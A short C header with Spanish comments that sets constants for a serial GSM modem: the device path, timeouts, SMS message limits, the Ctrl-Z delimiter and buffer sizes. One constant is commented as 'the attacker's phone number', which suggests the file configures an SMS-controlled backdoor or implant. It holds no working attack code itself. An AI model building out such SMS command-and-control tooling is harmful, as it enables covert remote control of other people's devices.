#ifndef _INFO_H
#define _INFO_H

/* El tiempo definido para recibir simbolos en modo canonico */
#define CHAR_TIMEOUT  15
/* El dispositivo emisor/receptor */
#define DEVICE        "/dev/ttyUSB2"
/* El número de teléfono del atacante */
#define PHONECONTROL  "<Aquí va el número de teléfono del atacante>"
/* El límite de mensajes que puede recibir el dispositivo */
#define MEMORY_INDEX  34
/* La longitud de la respuesta */
#define MESSAGE_LIMIT 151
/* El tiempo de espera para cada mensaje envíado */
#define LOOP_SLEEP    15
/* El carácter delimitador */
#define CHAR_DELIM    '\x1a'

/* El tamaño de los bufferes */
#define SHORT_DATA    32
#define MEDIUM_DATA   255
#define LONG_DATA     4096

#endif
